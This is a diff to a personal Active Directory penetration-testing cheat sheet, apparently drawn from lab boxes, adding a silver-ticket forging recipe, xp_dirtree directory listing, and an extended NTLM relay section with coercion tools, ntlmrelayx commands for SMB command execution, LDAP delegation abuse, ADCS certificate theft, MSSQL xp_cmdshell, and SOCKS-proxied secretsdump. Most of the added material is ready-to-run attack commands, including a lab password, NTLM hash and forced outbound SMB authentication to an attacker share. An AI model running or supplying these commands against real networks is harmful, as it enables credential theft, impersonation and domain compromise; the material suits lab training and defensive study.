@@ -1306,30 +1306,8 @@ psexec.py scrm.local/administrator@dc1.scrm.local -k -no-pas
 wmiexec.py scrm.local/administrator@dc1.scrm.local -k -no-pass
 smbexec.py scrm.local/administrator@dc1.scrm.local -k -no-pass
 
-```
-
-### Forging a Silver Ticket : 
-
-```bash
-
-==> If you have the Hash or password for the DB service account , Forge a silver ticket, impoersonating the DB Admin , we need the NTLM hash and the SID of the domain : 
-
-# 1 Convert Password to NTLM HASH : 
-
-echo -n 'Pegasus60' | iconv -t utf16le | openssl dgst -md4
-
-# 2 Get Domain SID : 
-
-nxc ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid
-
-# Forge the Tikcet & Login :
-
-ticketer.py -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn sqlsvc/dc1.scrm.local:1433 Administrator 
-
-export KRB5CCNAME=Administrator.ccache
-
-mssqlclient.py -k dc1.scrm.local -windows-auth
-
+==> Unet the ticket :
+unset KRB5CCNAME
 
 ```
 
@@ -1398,6 +1376,26 @@ SELECT TOP 100 FileColumnName FROM schema.YourTable;
 
 -- 7) Dump the entire table :
 SELECT * FROM Table_name ;
+
+-- 8) Dirtree enabled?
+
+exec xp_dirtree "C:\inetpub\wwwroot",1,1
+       ↑                              ↑ ↑
+     path                        depth  show files (yes)
+     
+     
+# 1st param — the path (what folder to look in)
+
+# 2nd param — depth (how many subfolder levels deep to recurse)
+
+==> 0 or omitted = unlimited depth, recurse everything below
+==> 1 = only show the immediate contents of that folder, don't go into subfolders
+
+# 3rd param — show files? (this is the one that confused you)
+
+==> 0 or omitted = only show subdirectories, hide files entirely
+==> 1 = also show files, not just folders     
+
 ```
 
 **Reverse Shell :** 
@@ -1427,17 +1425,179 @@ xp_dirtree \\KaliIP\Share
 On Kali : responder -I  tun0 -A -v 
 ```
 
+**Silver Ticket :**
+
+```bash
+
+==> MSSQL : Silver Ticket: If we get the hash of the account running the MSSQL service (the SPN owner, e.g. MSSQLSvc/host:1433), we can forge a silver ticket (TGS) directly no KDC contact needed. Instead of the PAC (Privilege Attribute Check) saying "this is sqlsvc," we forge it to say "this is Administrator." Since the ticket is encrypted with the service account's own key, MSSQL can decrypt and validate it locally but because silver tickets skip PAC validation with the DC, the service just trusts whatever identity is embedded, no cross-check performed. Result: we're authenticated to MSSQL as Administrator, without the DC ever being consulted. Scope is limited to that one SPN/service not domain-wide like a golden ticket.
+
+# 1 Convert Password to NTLM HASH : 
+
+echo -n 'Pegasus60' | iconv -t utf16le | openssl dgst -md4
+
+# 2 Get Domain SID : 
+
+nxc ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid
+
+# Forge the Tikcet & Login :
+
+ticketer.py -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn sqlsvc/dc1.scrm.local:1433 Administrator 
+
+export KRB5CCNAME=Administrator.ccache
+
+mssqlclient.py -k dc1.scrm.local -windows-auth
+
+```
+
+
+
+
 ### NTLM Relay :
+
+#### Relay 101 : 
 
 ```bash
 ==> First get all machines with No Smb Signing :
 nmap -p 139,445 --script smb-security-mode,smb2-security-mode -Pn -iL targets
 nxc smb targets  --gen-relay-list relay_targets.txt
 
-==> Use NTLM Relay to relay the Hash to one of those machines :
-impacket-ntlmrelayx -smb2support -t targets
+# Flow : 
+
+Victim  --NEGOTIATE-->  You  --NEGOTIATE-->  Real Target
+Victim  <--CHALLENGE---  You  <--CHALLENGE---  Real Target
+Victim  --AUTHENTICATE-> You  --AUTHENTICATE-> Real Target
+                                    (now authenticated as Victim)
+```
+
+#### First Step : Coercion Methods :
+
+```bash
+
+1/ PetitPotam --> Abuses MS-EFSRPC (EfsRpcOpenFileRaw) --> PetitPotam.py
+
+2/ PrinterBug --> Abuses MS-RPRN spooler RpcRemoteFindFirstPrinterChangeNotification --> printerbug.py, dementor.py
+
+3/ DFSCoerce --> Abuses MS-DFSNM --> dfscoerce.py
+
+4/ ShadowCoerce --> Abuses MS-FSRVP (VSS) --> shadowcoerce.py
+
+5/ Coercer	Automates trying all of the above against a target --> Coercer (all-in-one)
+
+6/ xp_dirtree / xp_fileexist --> MSSQL forced outbound SMB auth --> manual, via mssqlclient session
+
+7/ LLMNR/NBT-NS/mDNS poisoning --> Passive wait for broadcast name resolution failures --> Responder
+
+8/ WebDAV coercion	Force auth over HTTP instead of SMB (bypasses SMB signing entirely) --> PetitPotam.py with -d, WebDAV variants
+
+
+nxc smb $target -u '' -p '' -M coercer -o LISTENER=<your_ip>
 
 ```
+
+
+
+#### Relay Target :
+
+```bash
+
+1/ SMB --> Command exec if admin, file/share access --> DCs: signing required. Workstations: often not.
+2/ LDAP --> Add computer accounts, ACL edits, RBCD setup --> No signing by default (pre-2025 patches), but channel binding / EPA can block it
+3/ LDAPS --> Same as LDAP but over TLS --> Channel binding (CBT) often required blocks relay even without signing
+4/ HTTP(AD CS) --> Certificate enrollment as the victim (ESC8) --> Usually wide open unless EPA enabled
+5/ MSSQL --> DB access as victim --> Rare relay target but possible
+
+```
+
+#### Commands : 
+
+```bash
+
+==> First the coersion : 
+
+Coercer scan -u user -p pass -d domain.local -t <target_ip>
+Coercer coerce -u user -p pass -d domain.local -t <target_ip> -l <your_ip>
+nxc smb $target -u '' -p '' -M coercer -o LISTENER=<your_ip>
+
+==> Relay Commands : 
+
+1/ SMB : 
+
+ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
+
+# -i : for interactive shell 
+# -c : remove this and it will dump SAM automatically) 
+
+2/ LDAP (RBCD / ACL abuse / add computer) :
+
+
+ntlmrelayx.py -t ldap://$target -smb2support --delegate-access
+
+# --delegate-access --> automates the RBCD chain we discussed
+# --escalate-user <existing_user> --> adds that user to a privileged group if the relayed account has the rights
+# --add-computer <name> --> just creates a computer account without the RBCD attribute writes, if you want to do RBCD manually
+# default (no flag) --> drops you into an interactive LDAP shell to poke around ACLs yourself
+
+
+3/ HTTP / ADCS (ESC8) :
+
+
+ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController 
+
+# --template matters --> use DomainController or Machine if relaying a computer account's auth (like DC01$ or another machine), User template if relaying a user. 
+# This dumps you a .pfx cert, which you then feed to :
+
+gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass '' domain.local/DC01\$ dc01.ccache
+
+
+4/ MSSQL :
+
+ntlmrelayx.py -t mssql://$target -smb2support -q "EXEC xp_cmdshell 'whoami';"
+
+```
+
+#### Socks : 
+
+```bash
+
+Normal ntlmrelayx behavior: coercion fires --> auth gets relayed --> one action happens (dump SAM, set RBCD, run one command) --> session is discarded.
+
+If you want to do a second thing with that same identity, you need a second coercion trigger. In a real engagement this is noisy and unreliable : 
+
+With Socks : 
+
+The flow becomes : relay --> keep the authenticated session alive --> expose it as a local proxy --> let you run any tool against it, repeatedly, until the session naturally expires."
+
+When ntlmrelayx.py -socks runs, it does two things simultaneously:
+
+==> Starts the normal listener servers (SMB, HTTP, etc.) to catch incoming NTLM auth, same as always.
+Starts a local SOCKS4/5 proxy server on 127.0.0.1:1080 (default port).
+
+==> When a relay succeeds, instead of executing a one-shot action, it holds the underlying authenticated connection open in memory, tagged by:
+
+- Protocol (SMB, LDAP, MSSQL, HTTP, IMAP...)
+- Target IP
+- The relayed username
+
+ntlmrelayx.py -t ldap://$target -smb2support -socks
+
+==> Once a session lands, from that console:
+
+ntlmrelayx> socks
+
+==> This lists every currently-alive relayed session, e.g.:
+
+Protocol  Target        Username        AdminStatus  Port
+SMB       10.10.11.5    MANAGER\DC01$   TRUE         445
+LDAP      10.10.11.5    MANAGER\DC01$   N/A          389
+
+
+==> From there we can use the different tools we have with the privileges of the users/machine accounts that were relayed :
+
+proxychains secretsdump.py -just-dc manager.htb/DC01\$@10.10.11.5
+proxychains smbclient.py MANAGER/DC01\$@10.10.11.5
+proxychains GetUserSPNs.py manager.htb/ -dc-ip 10.10.11.5 -no-pass
+```
+
 ### Blood Hound :
 
 ```bash
